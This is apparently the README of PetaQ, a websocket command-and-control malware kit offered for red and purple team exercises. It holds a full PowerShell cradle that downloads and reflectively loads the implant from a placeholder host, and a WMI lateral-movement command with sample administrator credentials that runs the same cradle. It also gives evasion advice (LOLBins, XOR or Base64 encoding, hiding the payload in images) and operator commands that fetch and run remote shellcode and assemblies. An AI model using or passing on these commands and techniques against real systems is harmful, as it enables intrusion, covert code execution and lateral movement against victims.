# PetaQ
PetaQ is a malware which is being developed in .NET Core/Framework to use websockets as Command & Control (C2) channels. It's designed to provide a Proof of Concept (PoC) websocket malware to the adversary simulation exercises (Red & Purple Team exercises). 

I have used Petaq actively in my purple team exercises for my previous and current employers. Don't consider it as a full replacement of your C2, but would enrich your toolkit, interactive environment or evasive actions. It's not suitable for any production level use, but can be used for test purposes. 

* Petaq Service - The Command & Control Service (.NET Core)
* Petaq Implant - The Malware (.NET Framework)

# Meaning
P'takh (petaQ) is a Klingon insult, meaning something like "weirdo," deriving from the verb "to be weird" (taQ), with and [sic] you (plural) imperative prefix (pe-). Alternative romanizations include pahtak, p'tak, patahk, and pahtk.
http://www.klingonwiki.net/En/Cursing

# Disclaimer
* This tool is developed to assist Purple Team exercises, not adversaries. If they use it, blame on them, not me. 
* There are several bad programmig or technical decisions in this code which may make you highly uncomfortable. If so, please consider to not use it, submit a pull request or register a bug. If I can find some time for it and improve my programming skills, I'll make this code better in time. 

# Features
Communications
* WebSocket through HTTP(S) (Implant to C2)
* SMB Named Pipe (Implant to Implant)
* TCP (Implant to Implant)
* UDP (Implant to Implant)

Execution
* Execute a process (cmd.exe, powershell.exe or you choice)
* Execute .NET assemblies from remote (no touching disk)
* Execute .NET source code from remote (no touching disk)
* Execute .NET source code like a .NET C# shell (no touching disk)
* Execute X86/X64 shellcode using QueueUserAPC with Parent PID spoofing 
* All executions can also be a thread to avoid Petaq Implant to wait it finishing (e.g. execthread)

Multi-Level Linking Implants to Implants
* Implants can be linked to other implants pretty much like Cobalt Strike. This is supported on TCP, UDP and SMB Named Pipe. 
* Up to 8 level of linking worked well, and quite useful for lateral movement. However, I prefer to use TCP or UDP instead of SMB Named Pipe as its IO is not quite ready for multi-level implant communications. 

Lateral Movement
* WMI W32 Create is preferred/integrated
* In case of variety required; it's possible to use schtasks, sc, admin$ and powershell can be used through execthread command

# Documentation
The training videos and basic documentation will be coming soon. Until then, please discover the features through the source code walkthroughs and the commands below.

# Configuration
You can tweak the following files to configure the C2 and malware. 
* PetaqService configuration file is Properties/launchSettings.json
* PetaqImplant configuration file is Configuration.cs

# Installation
The service is for .NET Core, so it can run on any .NET Core 2.2.* instances on Windows, Linux or Mac. To run the service, you can simply give "dotnet run" command. You may need to install a bunch of nuget packages to satisfy the requirements before compiling it.

The malware needs to be compiled using .NET Framework as it has inline .NET compiler and Win P/Invoke used. To compile the malware, you can run "csc /out:malware.exe *.cs" in the petaqimplant folder.

# Deployment to the Victims
Even though it's too noisy, running the following Powershell line would load the compiled Petaq Implant as reflected assembly for testing. You can compile the Petaq Implant as above, then place it into the wwwroot folder of Petaq Service as index.html. So the url would point to the binary to load directly.
powershell –c $m=new-object net.webclient;$Url='http://PETAQIMPLANTHOSTEDSITE/';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))

I suggest you to some operational security measures for any production or evasive testing. 
* Consider InstallUtil, Regsvr32, RegAsm, DotNettoJs, RunDLL32, WMI or MSBuild for evasive initial execution.
* Consider using XOR for the implant to convert, Base64 encoding or hiding it in an image file to avoid network detections.
* Consider replacing some Petaq words in the source code. Even though currently 

# In Action
```
2020-5-18---16-41-36
Hosting environment: Development
Content root path: /tmp/petaqC2/petaqservice
Now listening on: https://0.0.0.0:443
Now listening on: http://0.0.0.0:80
Application started. Press Ctrl+C to shut down.
Petaq - Purple Team Simulation Kit
# Creating Logs/2020-5-18---16-41-36 folder.
Log file Logs/2020-5-18---16-41-36/29B0OAZEX3CEAW2V2UAQ.txt created.
# Registering the implant...
Implant registration for 29B0OAZEX3CEAW2V2UAQ is done.
Links are adding to the implant...
# list
Session ID		User Name		Hostname	IP Address	Status		Link URI
29B0OAZEX3CEAW2V2UAQ	SHEEP\dev		Sheep		172.16.121.142	connected	ws://172.16.121.1:80/ws
# use 29B0OAZEX3CEAW2V2UAQ
Use 'back' instruction for the main menu.
29B0OAZEX3CEAW2V2UAQ # exec whoami
29B0OAZEX3CEAW2V2UAQ # Waiting for the process to complete...
29B0OAZEX3CEAW2V2UAQ # sheep\dev

29B0OAZEX3CEAW2V2UAQ # exit
# Session 29B0OAZEX3CEAW2V2UAQ is disconnected.
#
# list
Session ID		User Name		Hostname	IP Address	Status		Link URI
29B0OAZEX3CEAW2V2UAQ	SHEEP\dev		Sheep		172.16.121.142	disconnected	ws://172.16.121.1:80/ws
# exit
Also use CTRL+C for stopping the implant services.
CApplication is shutting down...
```

# Usage Examples
Petaq Implant Run Arguments:
###It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
    ```petaqimplant.exe ws://172.16.121.1/ws
    petaqimplant.exe wss://172.16.121.1:443/ws``` (SSL)
###It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
    ```petaqimplant.exe tcp 8000```
###It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
    ```petaqimplant.exe udp 8000```
###It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
    ```petaqimplant.exe smb pipename1```

Petaq Service Commands:
```Help:
        help
    List the Implants:
        list
    Use the Implant:
        use SessionID
    Remove the Implant:
        remove SessionID
    Show Routes for Linked Implants:
        route
    Exit:
        exit
        terminate```
Practical Examples on Petaq Implant in Interaction (use ImplantID):
Usage Examples:
```exec cmd /c dir
        exec net use
        exec powershell -c Write-Output($env:UserName)
        exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
        exec-sharpassembly url http://127.0.0.1/test.exe
        exec-sharpcode base64 http://127.0.0.1/test.b64
        exec-sharpcode url http://127.0.0.1/test.cs
        exec-sharpcode base64 http://127.0.0.1/test.cs.b64
        exec-sharpdirect Console.WriteLine(""test 1234"");
        link tcp://127.0.0.1/8002
        link udp://127.0.0.1/8002
        link smb://127.0.0.1
        link smb://127.0.0.1/petaq_comm```
Link operations:
```route
        sessions
        link URI
        unlink ID```
Lateral movement:
```lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"```
Execute a command/binary:
```exec cmd.exe /c dir
        exec powershell -c Write-Output($env:UserName)```
Execute a command/binary/assembly as a thread (no wait, no output):
```execthread cmd.exe /c dir
        execthread powershell -c Write-Output($env:UserName)
        execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
        execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
        execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
        execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters```
Inline run for .NET source code:
```exec-sharpdirect SHARPCODE
        exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE```
Execute a .NET assembly:
```exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
        exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters```
Compile & Execute .NET source code:
``` exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
        exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters```
Execute Shellcode:
```exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
        exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
        exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
        exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2```
Exit:
```
        exit
        terminate
```
